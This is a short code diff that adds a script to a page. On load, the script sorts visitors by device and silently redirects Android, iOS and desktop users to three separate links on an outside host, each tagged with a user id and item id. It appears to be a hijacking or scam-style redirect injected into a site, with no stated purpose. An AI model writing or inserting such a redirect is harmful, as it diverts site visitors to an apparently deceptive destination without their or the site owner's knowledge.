@@ -1,0 +1,14 @@
+<script>
+  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+  if (/android/i.test(userAgent)) {
+    // Redirect Android users
+    window.location.href = "https://singingfiles.com/show.php?l=0&u=77670&id=69168";
+  } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
+    // Redirect iOS users (iPhone, iPad, iPod)
+    window.location.href = "https://singingfiles.com/show.php?l=0&u=77670&id=59476";
+  } else {
+    // Redirect desktop users (PC)
+    window.location.href = "https://singingfiles.com/show.php?l=0&u=77670&id=69167";
+  }
+</script>
